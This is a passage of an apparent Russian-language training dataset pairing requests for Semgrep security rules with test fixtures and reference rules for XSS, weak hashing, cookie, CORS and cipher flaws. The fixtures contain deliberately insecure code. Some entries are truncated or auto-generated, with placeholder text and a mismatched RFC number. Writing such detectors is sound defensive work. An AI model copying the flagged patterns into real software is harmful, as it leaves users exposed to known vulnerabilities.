focus-metavariable: $Y\n    - pattern-not: |\n        $X.$TRUST(`...`)\n    - pattern-not: |\n        $X.$TRUST(\"...\")\n    - metavariable-regex:\n        metavariable: $TRUST\n        regex: (bypassSecurityTrustHtml|bypassSecurityTrustStyle|bypassSecurityTrustScript|bypassSecurityTrustUrl|bypassSecurityTrustResourceUrl)\n  pattern-sanitizers:\n  - patterns:\n    - pattern-either:\n      - pattern-inside: |\n          import $S from \"underscore.string\"\n          ...\n      - pattern-inside: |\n          import * as $S from \"underscore.string\"\n          ...\n      - pattern-inside: |\n          import $S from \"underscore.string\"\n          ...\n      - pattern-inside: |\n          $S = require(\"underscore.string\")\n          ...\n    - pattern-either:\n      - pattern: $S.escapeHTML(...)\n  - patterns:\n    - pattern-either:\n      - pattern-inside: |\n          import $S from \"dompurify\"\n          ...\n      - pattern-inside: |\n          import { ..., $S,... } from \"dompurify\"\n          ...\n      - pattern-inside: |\n          import * as $S from \"dompurify\"\n          ...\n      - pattern-inside: |\n          $S = require(\"dompurify\")\n          ...\n      - pattern-inside: |\n          import $S from \"isomorphic-dompurify\"\n          ...\n      - pattern-inside: |\n          import * as $S from \"isomorphic-dompurify\"\n          ...\n      - pattern-inside: |\n          $S = require(\"isomorphic-dompurify\")\n          ...\n    - pattern-either:\n      - patterns:\n        - pattern-inside: |\n            $VALUE = $S(...)\n            ...\n        - pattern: $VALUE.sanitize(...)\n      - patterns:\n        - pattern-inside: |\n            $VALUE = $S.sanitize\n            ...\n        - pattern: $S(...)\n      - pattern: $S.sanitize(...)\n      - pattern: $S(...)\n  - patterns:\n    - pattern-either:\n      - pattern-inside: |\n          import $S from 'xss';\n          ...\n      - pattern-inside: |\n          import * as $S from 'xss';\n          ...\n      - pattern-inside: |\n          $S = require(\"xss\")\n          ...\n    - pattern: $S(...)\n  - patterns:\n    - pattern-either:\n      - pattern-inside: |\n          import $S from 'sanitize-html';\n          ...\n      - pattern-inside: |\n          import * as $S from \"sanitize-html\";\n          ...\n      - pattern-inside: |\n          $S = require(\"sanitize-html\")\n          ...\n    - pattern: $S(...)\n  - patterns:\n    - pattern: sanitizer.sanitize(...)\n    - pattern-not: sanitizer.sanitize(SecurityContext.NONE, ...);\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования метода bypassSecurityTrust в Angular, который может привести к XSS-уязвимости, если входные данные предоставляются пользователем. Источники (sources) определяют места, откуда могут поступать небезопасные данные, а синки (sinks) указывают на методы, которые потенциально могут быть небезопасными при использовании небезопасных входных данных. Правило проверяет наличие вызова методов bypassSecurityTrust с переменной ($X), которая не является жестко закодированной строкой или литералом, и использует метапеременную $Y для проверки наличия вызова с использованием метода $TRUST.\n\n# Ключевые элементы:\n- ID: angular-bypasssecuritytrust\n- Язык: typescript \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "angular-bypasssecuritytrust",
      "language": "typescript",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения avoid-render-inline\nОписание уязвимости: 'render inline: ...' renders an entire ERB template inline and is dangerous. If external data can reach here, this exposes your application to server-side template injection (SSTI) or cross-site scripting (XSS) attacks. Instead, consider using a partial or another safe rendering method.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: ruby",
    "input": "Требования:\n- Язык: ruby\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: avoid-render-inline.rb\n# cf. https://github.com/rails/rails/blob/939fe523126198d43ecedeacc05dd7fdb1eae3d9/actionpack/test/controller/action_pack_assertions_test.rb\n\n\n# frozen_string_literal: true\n\nrequire \"abstract_unit\"\nrequire \"controller/fake_controllers\"\n\nclass ActionPackAssertionsController < ActionController::Base\n  def nothing() head :ok end\n\n  # ok: avoid-render-inline\n  def hello_xml_world() render template: \"test/hello_xml_world\"; end\n\n  def assign_this\n    @howdy = \"ho\"\n    # ruleid: avoid-render-inline\n    render inline: \"Mr. Henke\"\n  end\n\n  def render_based_on_parameters\n    # ok: avoid-render-inline\n    render plain: \"Mr. #{params[:name]}\"\n  end\n\n  def render_url\n    # ok: avoid-render-inline\n    render html: \"<div>#{url_for(action: 'flash_me', only_path: true)}</div>\"\n  end\n\n  def render_text_with_custom_content_type\n    # ok: avoid-render-inline\n    render body: \"Hello!\", content_type: Mime[:rss]\n  end\n\n  def session_stuffing\n    session[\"xmas\"] = \"turkey\"\n    # ok: avoid-render-inline\n    render text: \"ho ho ho\"\n  end\n\n  def raise_exception_on_get\n    raise \"get\" if request.get?\n    # ok: avoid-render-inline\n    render text: \"request method: #{request.env['REQUEST_METHOD']}\"\n  end\n\n  def raise_exception_on_post\n    raise \"post\" if request.post?\n    # ok: avoid-render-inline\n    render plain: \"request method: #{request.env['REQUEST_METHOD']}\"\n  end\n\n  def render_file_absolute_path\n    # ok: avoid-render-inline\n    render file: File.expand_path(\"../../README.rdoc\", __dir__)\n  end\n\n  def render_file_relative_path\n    # ok: avoid-render-inline\n    render file: \"README.rdoc\"\n  end\nend\n\n# Used to test that assert_response includes the exception message\n# in the failure message when an action raises and assert_response\n# is expecting something other than an error.\nclass AssertResponseWithUnexpectedErrorController < ActionController::Base\n  def index\n    raise \"FAIL\"\n  end\n\n  def show\n    # ok: avoid-render-inline\n    render plain: \"Boom\", status:   # Ограничиваем длину\n\nОпасные паттерны:\n• render inline: \"<%= params[:input] %>\"\n• render inline: \"<%= @user.name %>\"\n• render inline: \"<%= current_user.email %>\"\n\nБезопасные паттерны:  \n• render template: \"template_name\"\n• render plain: \"text\"\n• render html: \"<div>html content</div>\"\n\nЛегенда аннотаций:\n- // ruleid:avoid-render-inline: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:avoid-render-inline: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: avoid-render-inline\n  metadata:\n    source-rule-url: https://github.com/presidentbeef/brakeman/blob/main/lib/brakeman/checks/check_render_inline.rb\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    references:\n    - https://brakemanpro.com/2017/09/08/cross-site-scripting-in-rails#inline-renders---even-worse-than-xss\n    category: security\n    technology:\n    - rails\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  message: >-\n    'render inline: ...' renders an entire ERB template inline and is dangerous.\n    If external data can reach here, this exposes your application\n    to server-side template injection (SSTI) or cross-site scripting (XSS) attacks.\n    Instead, consider using a partial or another safe rendering method.\n  languages: [ruby]\n  severity: WARNING\n  pattern: 'render inline: ...'\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования метода 'render inline:' в Ruby/Rails приложениях. Паттерн ищет точное совпадение строки 'render inline: ...'. Опасным является случай, когда внешний ввод может достичь этого места, так как это открывает возможность для серверной инъекции шаблонов (Server Side Template Injection, SSTI) или межсайтовых скриптовых атак (Cross-site Scripting, XSS). Правило рекомендует использовать альтернативные безопасные методы рендеринга.\n\n# Ключевые элементы:\n- ID: avoid-render-inline\n- Язык: ruby \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "avoid-render-inline",
      "language": "ruby",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: unsafe-argon2-config\nОписание уязвимости: Prefer Argon2id where possible. Per RFC9016, section 4 IETF recommends selecting Argon2id unless you can guarantee an adversary has no direct access to the computing environment.\nCWE: CWE-916: Use of Password Hash With Insufficient Computational Effort\nТип анализа: taint\nЯзык: javascript\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле\nСпособы санитации: определены в правиле",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: taint\n- CWE: CWE-916: Use of Password Hash With Insufficient Computational Effort\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: unsafe-argon2-config.js\nconst argon2 = require(\"argon2\");\n\nconst hashSettings = {\n  type: argon2.argon2i,\n  memoryCost: 2 ** 16,\n  parallelism: os.cpus().length || 8,\n};\n\nconst goodHashSettings = {\n  type: argon2.argon2id,\n  memoryCost: 2 ** 16,\n  parallelism: os.cpus().length || 8,\n};\n\nconst prepareSavingGood = (user) => {\n  if (!user.Password) return Promise.resolve(user);\n\n\n  return argon2\n    // ok: unsafe-argon2-config\n    .hash(user.Password, goodHashSettings)\n    .then((hash) => ({ ...user, Password: hash }))\n    .catch((err) => console.error(`Error during hashing: ${err}`));\n};\n\nconst prepareSavingBad = (user) => {\n  if (!user.Password) return Promise.resolve(user);\n\n\n  return argon2\n    // ruleid:unsafe-argon2-config\n    .hash(user.Password, hashSettings)\n    .then((hash) => ({ ...user, Password: hash }))\n    .catch((err) => console.error(`Error during hashing: ${err}`));\n};\n\nconst bad = (user) => {\n  if (!user.Password) return Promise.resolve(user);\n  const hashSettings = {\n    type: argon2.argon2i,\n    memoryCost: 2 ** 16,\n    parallelism: os.cpus().length || 8,\n  };\n\n  return argon2\n    // ruleid:unsafe-argon2-config\n    .hash(user.Password, hashSettings)\n    .then((hash) => ({ ...user, Password: hash }))\n    .catch((err) => console.error(`Error during hashing: ${err}`));\n};\n\nfunction okTest(user) {\n  if (!user.Password) return Promise.resolve(user);\n  // ok: unsafe-argon2-config\n  return argon2\n    .hash(user.Password, {\n      type: argon2.argon2id,\n      memoryCost: 2 ** 16,\n      parallelism: os.cpus().length || 8,\n    })\n    .then((hash) => ({ ...user, Password: hash }))\n    .catch((err) => console.error(`Error during hashing: ${err}`));\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• const hashSettings = {type: argon2.argon2i,...};\n• const prepareSavingBad = (user) => {...argon2.hash(user.Password, hashSettings)...}\n• const bad = (user) => {...argon2.hash(user.Password, hashSettings)...}\n\nБезопасные паттерны:  \n• const goodHashSettings = {type: argon2.argon2id,...};\n• return argon2.hash(user.Password, {type: argon2.argon2id,...});\n• function okTest(user) {...argon2.hash(user.Password, {type: argon2.argon2id,...})...}\n\nЛегенда аннотаций:\n- // ruleid:unsafe-argon2-config: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:unsafe-argon2-config: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: unsafe-argon2-config\n  message: >-\n    Prefer Argon2id where possible. Per RFC9016, section 4 IETF recommends selecting Argon2id unless you\n    can guarantee an adversary has no direct access to the computing environment.\n  metadata:\n    references:\n    - https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html\n    - https://eprint.iacr.org/2016/759.pdf\n    - https://www.cs.tau.ac.il/~tromer/papers/cache-joc-20090619.pdf\n    - https://datatracker.ietf.org/doc/html/rfc9106#section-4\n    category: security\n    cwe:\n    - 'CWE-916: Use of Password Hash With Insufficient Computational Effort'\n    technology:\n    - argon2\n    - cryptography\n    owasp:\n    - A02:2021 - Cryptographic Failures\n    subcategory:\n    - vuln\n    impact: LOW\n    likelihood: HIGH\n    confidence: MEDIUM\n  languages:\n  - javascript\n  - typescript\n  severity: WARNING\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern-inside: |\n        $ARGON = require('argon2');\n        ...\n    - pattern: |\n        {type: ...}\n  pattern-sinks:\n  - patterns:\n    - pattern: |\n        $Y\n    - pattern-inside: |\n        $ARGON.hash(...,$Y)\n  pattern-sanitizers:\n  - patterns:\n    - pattern: |\n        {type: $ARGON.argon2id}\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования конфигурации Argon2 с типом 'argon2i' вместо рекомендуемого 'argon2id'. Анализ выполняется методом taint, где источники (sources) включают инициализацию объекта Argon2 и определение типа хеширования. Синки (sinks) определяются вызовом функции hash() с передачей конфигурации Argon2. Правило также учитывает случаи, когда тип конфигурации явно установлен как 'argon2id', что считается безопасным использованием.\n\n# Ключевые элементы:\n- ID: unsafe-argon2-config\n- Язык: javascript \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "unsafe-argon2-config",
      "language": "javascript",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: pyramid-set-cookie-samesite-unsafe-value\nОписание уязвимости: Found a Pyramid cookie without the samesite option correctly set. Pyramid cookies should be handled securely by setting samesite='Lax' in response.set_cookie(...). If this parameter is not properly set, your cookies are not properly protected and are at risk of being stolen by an attacker.\nCWE: CWE-1275: Sensitive Cookie with Improper SameSite Attribute\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-1275: Sensitive Cookie with Improper SameSite Attribute\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: set-cookie-samesite-unsafe-value.py\nfrom pyramid import httpexceptions as exc\nfrom pyramid.view import view_config\n\n### True positives ###\n\n\n@view_config(route_name='my_view')\ndef my_bad_view1(request):\n    response = request.response\n    # ruleid: pyramid-set-cookie-samesite-unsafe-value\n    response.set_cookie('MY_COOKIE', samesite=None,\n                        value='MY_COOKIE_VALUE', secure=True, httponly=True)\n    return {'foo': 'bar'}\n\n\n@view_config(route_name='my_view')\ndef my_bad_view2(request):\n    resp = exc.HTTPFound(location=request.referer or request.application_url)\n    resp.set_cookie('MY_COOKIE', value='MY_COOKIE_VALUE',\n                    # ruleid: pyramid-set-cookie-samesite-unsafe-value\n                    samesite=None, secure=True, httponly=True)\n    return resp\n\n\n### True negatives ###\n\n@view_config(route_name='my_view')\ndef my_good_view1(request):\n    response = request.response\n    # ok: pyramid-set-cookie-samesite-unsafe-value\n    response.set_cookie('MY_COOKIE', value='MY_COOKIE_VALUE',\n                        secure=True, httponly=True, samesite='Lax')\n    return {'foo': 'bar'}\n\n\n@view_config(route_name='my_view')\ndef my_good_view3(request):\n    resp = exc.HTTPFound(location=request.referer or request.application_url)\n    # ok: pyramid-set-cookie-samesite-unsafe-value\n    resp.set_cookie('MY_COOKIE', secure=True, httponly=True, samesite='Lax')\n    return resp\n\n\n@view_config(route_name='my_view')\ndef my_good_view4(request):\n    resp = exc.HTTPFound(location=request.referer or request.application_url)\n    # ok: pyramid-set-cookie-samesite-unsafe-value\n    resp.set_cookie('MY_COOKIE', **global_cookie_flags)\n    return resp\n\n\n// File: set-cookie-samesite-unsafe-value.fixed.py\nfrom pyramid import httpexceptions as exc\nfrom pyramid.view import view_config\n\n### True positives ###\n\n\n@view_config(route_name='my_view')\ndef my_bad_view1(request):\n    response = request.response\n    # ruleid: pyramid-set-cookie-samesite-unsafe-value\n    resp  # Ограничиваем длину\n\nОпасные паттерны:\n• @view_config(route_name='my_view')\ndef my_bad_view1(request):\n    response = request.response\n    # ruleid: pyramid-set-cookie-samesite-unsafe-value\n    response.set_cookie('MY_COOKIE', samesite=None,\n• @view_config(route_name='my_view')\ndef my_bad_view2(request):\n    resp = exc.HTTPFound(location=request.referer or request.application_url)\n    resp.set_cookie('MY_COOKIE', value='MY_COOKIE_VALUE',\n  \n\nБезопасные паттерны:  \n• @view_config(route_name='my_view')\ndef my_good_view1(request):\n    response = request.response\n    # ok: pyramid-set-cookie-samesite-unsafe-value\n    response.set_cookie('MY_COOKIE', value='MY_COOKIE_\n• @view_config(route_name='my_view')\ndef my_good_view3(request):\n    resp = exc.HTTPFound(location=request.referer or request.application_url)\n    # ok: pyramid-set-cookie-samesite-unsafe-value\n    resp\n\nЛегенда аннотаций:\n- // ruleid:pyramid-set-cookie-samesite-unsafe-value: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:pyramid-set-cookie-samesite-unsafe-value: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: pyramid-set-cookie-samesite-unsafe-value\n  patterns:\n  - pattern-either:\n    - pattern-inside: |\n        @pyramid.view.view_config(...)\n        def $VIEW($REQUEST):\n            ...\n            $RESPONSE = $REQUEST.response\n            ...\n    - pattern-inside: |\n        def $VIEW(...):\n            ...\n            $RESPONSE = pyramid.httpexceptions.HTTPFound(...)\n            ...\n  - pattern-not: $RESPONSE.set_cookie(..., **$PARAMS)\n  - pattern: $RESPONSE.set_cookie(..., samesite=$SAMESITE, ...)\n  - pattern: $SAMESITE\n  - metavariable-regex:\n      metavariable: $SAMESITE\n      regex: (?!'Lax')\n  fix: |\n    'Lax'\n  message: >-\n    Found a Pyramid cookie without the samesite option correctly set.\n    Pyramid cookies should be handled securely by setting samesite='Lax' in response.set_cookie(...).\n    If this parameter is not properly set, your cookies are not properly protected and\n    are at risk of being stolen by an attacker.\n  metadata:\n    cwe:\n    - 'CWE-1275: Sensitive Cookie with Improper SameSite Attribute'\n    owasp:\n    - A01:2021 - Broken Access Control\n    category: security\n    technology:\n    - pyramid\n    references:\n    - https://owasp.org/Top10/A01_2021-Broken_Access_Control\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: LOW\n    confidence: MEDIUM\n  languages: [python]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов функции set_cookie в контексте Pyramid framework, где параметр samesite не установлен или установлен некорректно ('None' или отсутствует). Правило использует комбинацию шаблонов для идентификации контекста вызова функции и проверки наличия параметра samesite. Если параметр samesite отсутствует или имеет значение отличное от 'Lax', правило отмечает код как небезопасный.\n\n# Ключевые элементы:\n- ID: pyramid-set-cookie-samesite-unsafe-value\n- Язык: python \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "pyramid-set-cookie-samesite-unsafe-value",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: symfony-permissive-cors\nОписание уязвимости: Access-Control-Allow-Origin response header is set to \"*\". This will disable CORS Same Origin Policy restrictions.\nCWE: CWE-346: Origin Validation Error\nТип анализа: search\nЯзык: php",
    "input": "Требования:\n- Язык: php\n- Тип анализа: search\n- CWE: CWE-346: Origin Validation Error\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: symfony-permissive-cors.php\n<?php\nnamespace symfony;\nuse Symfony\\Component\\HttpFoundation\\Response;\nuse Symfony\\Component\\HttpFoundation\\Response as FooResponse;\n\n// ruleid: symfony-permissive-cors\n$response = new Response('content', Response::HTTP_OK, ['Access-Control-Allow-Origin' => '*']);\n\n// ruleid: symfony-permissive-cors\n$response = new Response('content', Response::HTTP_OK, Array('Access-Control-Allow-Origin' => '*'));\n\n// ruleid: symfony-permissive-cors\n$response = new response('content', Response::HTTP_OK, Array('Access-Control-Allow-Origin' => '*'));\n\n// ruleid: symfony-permissive-cors\n$response = new FooResponse('content', Response::HTTP_OK, ['Access-Control-Allow-Origin' => '*']);\n\n\n$headers = ['Access-Control-Allow-Origin' => '*'];\n// ruleid: symfony-permissive-cors\n$response = new Response('content', Response::HTTP_OK, $headers);\n\n\n// ruleid: symfony-permissive-cors\n$response->headers->set('  access-control-allow-origin  ', '  *  ');\n\n\n\n$safe = ['foo' => 'bar'];\n// ok: symfony-permissive-cors\n$response = new Response('content', Response::HTTP_OK, $safe);\n\n// ok: symfony-permissive-cors\n$response = new Response('content', Response::HTTP_OK, ['Access-Control-Allow-Origin' => 'https://www.example.com']);\n\n// ok: symfony-permissive-cors\n$response = new Response('content', Response::HTTP_OK, ['Other-Property' => '*']);\n\n// ok: symfony-permissive-cors\n$response = new Foo('content', Response::HTTP_OK, ['Access-Control-Allow-Origin' => '*']);\n\n// ok: symfony-permissive-cors\n$response->headers->set('Access-Control-Allow-Origin', 'foo');\n\n// ok: symfony-permissive-cors\n$response->headers->set('Other-Property', '*');  # Ограничиваем длину\n\nОпасные паттерны:\n• Пример опасного кода не сгенерирован\n\nБезопасные паттерны:  \n• Пример безопасного кода не сгенерирован\n\nЛегенда аннотаций:\n- // ruleid:symfony-permissive-cors: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:symfony-permissive-cors: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: symfony-permissive-cors\n  patterns:\n  - pattern-inside: |\n      use Symfony\\Component\\HttpFoundation\\Response;\n      ...\n  - pattern-either:\n    - patterns:\n      - pattern-either:\n        - pattern: |\n            new Symfony\\Component\\HttpFoundation\\Response($X, $Y, $HEADERS, ...)\n        - pattern: new Response($X, $Y, $HEADERS, ...)\n      - pattern-either:\n        - pattern: new $R($X, $Y, [$KEY => $VALUE], ...)\n        - pattern-inside: |\n            $HEADERS = [$KEY => $VALUE];\n            ...\n    - patterns:\n      - pattern: $RES->headers->set($KEY, $VALUE)\n  - metavariable-regex:\n      metavariable: $KEY\n      regex: (\\'|\\\")\\s*(Access-Control-Allow-Origin|access-control-allow-origin)\\s*(\\'|\\\")\n  - metavariable-regex:\n      metavariable: $VALUE\n      regex: (\\'|\\\")\\s*(\\*)\\s*(\\'|\\\")\n  message: >-\n    Access-Control-Allow-Origin response header is set to \"*\".\n    This will disable CORS Same Origin Policy restrictions.\n  metadata:\n    references:\n    - https://developer.mozilla.org/ru/docs/Web/HTTP/Headers/Access-Control-Allow-Origin\n    owasp:\n    - A07:2021 - Identification and Authentication Failures\n    cwe:\n    - 'CWE-346: Origin Validation Error'\n    category: security\n    technology:\n    - symfony\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  languages: [php]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования заголовка Access-Control-Allow-Origin со значением '*'. Анализ выполняется путем проверки создания объекта Response из библиотеки Symfony Http Foundation или аналогичного класса Response. Правило также проверяет наличие установки заголовка через метод headers->set(). Использование регулярного выражения позволяет точно сопоставить метапеременную $KEY с именем заголовка и метапеременную $VALUE с конкретным значением '*'. Опасный пример включает прямое указание '*' в заголовке, безопасный пример демонстрирует корректное задание конкретного домена.\n\n# Ключевые элементы:\n- ID: symfony-permissive-cors\n- Язык: php \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "symfony-permissive-cors",
      "language": "php",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения use-of-blowfish\nОписание уязвимости: Use of Blowfish was detected. Blowfish uses a 64-bit block size that  makes it vulnerable to birthday attacks, and is therefore considered non-compliant.  Instead, use a strong, secure cipher: Cipher.getInstance(\"AES/CBC/PKCS7PADDING\"). See https://owasp.org/www-community/Using_the_Java_Cryptographic_Extensions for more information.\nCWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: use-of-blowfish.java\nclass Blowfish{\n  public void useofBlowfish() {\n    // ruleid: use-of-blowfish\n    Cipher.getInstance(\"Blowfish\");\n  }\n\n  public void useofBlowfish2() {\n    // ruleid: use-of-blowfish\n    useCipher(Cipher.getInstance(\"Blowfish\"));\n  }\n\n  public void ok() {\n    // ok: use-of-blowfish\n    Cipher.getInstance(\"AES/CBC/PKCS7PADDING\");\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• Cipher.getInstance(\"Blowfish\")\n• useCipher(Cipher.getInstance(\"Blowfish\"))\n\nБезопасные паттерны:  \n• Cipher.getInstance(\"AES/CBC/PKCS7PADDING\")\n\nЛегенда аннотаций:\n- // ruleid:use-of-blowfish: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:use-of-blowfish: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: use-of-blowfish\n  pattern: $CIPHER.getInstance(\"Blowfish\") \n  metadata:\n    functional-categories:\n      - 'crypto::search::symmetric-algorithm::javax.crypto'\n    cwe:\n    - 'CWE-327: Use of a Broken or Risky Cryptographic Algorithm'\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    category: security\n    technology:\n    - java\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n    - https://googleprojectzero.blogspot.com/2022/10/rc4-is-still-considered-harmful.html\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: HIGH\n  message: >-\n    Use of Blowfish was detected. Blowfish uses a 64-bit block size that \n    makes it vulnerable to birthday attacks, and is therefore considered non-compliant. \n    Instead, use a strong, secure cipher: Cipher.getInstance(\"AES/CBC/PKCS7PADDING\").\n    See https://owasp.org/www-community/Using_the_Java_Cryptographic_Extensions\n    for more information.\n  severity: WARNING\n  languages:\n  - java\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования алгоритма шифрования Blowfish в Java-коде. Анализ выполняется путем поиска вызова метода getInstance класса Cipher с передачей аргумента 'Blowfish'. Правило применимо только к Java-коду и связано с использованием небезопасных криптографических алгоритмов.\n\n# Ключевые элементы:\n- ID: use-of-blowfish\n- Язык: java \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "use-of-blowfish",
      "language": "java",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: template-explicit-unescape\nОписание уязвимости: Detected an explicit unescape in a Pug template, using either '!=' or '!{...}'. If external data can reach these locations, your application is exposed to a cross-site scripting (XSS) vulnerability. If you must do this, ensure no external data can reach this location.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: explicit-unescape.pug\n// cf. https://github.com/abdulaz1z/nodejs-pug-starter/blob/42b48dd68416a87904258d1228686321206efc36/views/index.pug\ndoctype html\nhtml(lang=\"en\")\n  include includes/head.pug\n  body\n    //- Navigation\n    nav(class=\"navbar navbar-expand-lg navbar-dark bg-dark fixed-bottom\")\n      div(class=\"container\")\n        a(class=\"navbar-brand\" href=\"/\") NodeJs-Pug-Starter\n        button(class=\"navbar-toggler\" type=\"button\" data-toggle=\"collapse\" data-target=\"#navbarResponsive\" aria-controls=\"navbarResponsive\" aria-expanded=\"false\" aria-label=\"Toggle navigation\")\n          span(class=\"navbar-toggler-icon\")\n\n        div(class=\"collapse navbar-collapse\" id=\"navbarResponsive\")\n          ul(class=\"navbar-nav ml-auto\")\n            li(class=\"nav-item\")\n              a(class=\"nav-link\" href=\"/\") Home\n            li(class=\"nav-item\")\n              // ruleid: template-explicit-unescape\n              a(class=\"nav-link\" target=\"_blank\" href!=url) Documentation\n\n    // ok: template-explicit-unescape\n    if disableSignUp !== true\n      a.button(href=\"/signup\")=t(\"Signup\")\n\n    //- Page Content\n    section\n      div(class=\"container\")\n        div(class=\"row\")\n          div(class=\"col-lg-6\")\n            // ruleid: template-explicit-unescape\n            h1(class=\"mt-5 text-white\") !{title_text}\n            p(class= \"text-light\") This project is a simple application skeleton for a NodeJs web app with PugJs templating. You can use it to quickly bootstrap your NodeJs webapp projects and dev environment for these projects.\n\n    script(src='vendor/jquery/jquery.min.js')\n    script(src='vendor/bootstrap/js/bootstrap.bundle.min.js')  # Ограничиваем длину\n\nОпасные паттерны:\n• a(class=\"nav-link\" target=\"_blank\" href!=url) Documentation\n• h1(class=\"mt-5 text-white\") !{title_text}\n\nБезопасные паттерны:  \n• if disableSignUp !== true\n  a.button(href=\"/signup\")=t(\"Signup\")\n• div(class=\"col-lg-6\")\n  h1(class=\"mt-5 text-white\") title_text\n\nЛегенда аннотаций:\n- // ruleid:template-explicit-unescape: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:template-explicit-unescape: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: template-explicit-unescape\n  message: >-\n    Detected an explicit unescape in a Pug template, using either\n    '!=' or '!{...}'. If external data can reach these locations,\n    your application is exposed to a cross-site scripting (XSS)\n    vulnerability. If you must do this, ensure no external data\n    can reach this location.\n  metadata:\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    references:\n    - https://pugjs.org/language/code.html#unescaped-buffered-code\n    - https://pugjs.org/language/attributes.html#unescaped-attributes\n    category: security\n    technology:\n    - express\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  languages:\n  - regex\n  severity: WARNING\n  paths:\n    include:\n    - '*.pug'\n  pattern-either:\n  - pattern-regex: \\w.*(!=)[^=].*\n  - pattern-regex: '!{.*?}'\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска шаблонов, указывающих на явное неэкранирование данных в шаблонах Pug. Паттерны ищут конструкции, использующие '!=' или '!{' внутри атрибутов HTML или текста шаблона, что может привести к XSS-уязвимостям, если данные поступают извне. Правило применимо только к файлам с расширением .pug.\n\n# Ключевые элементы:\n- ID: template-explicit-unescape\n- Язык: regex \n- Тип: audit\n- 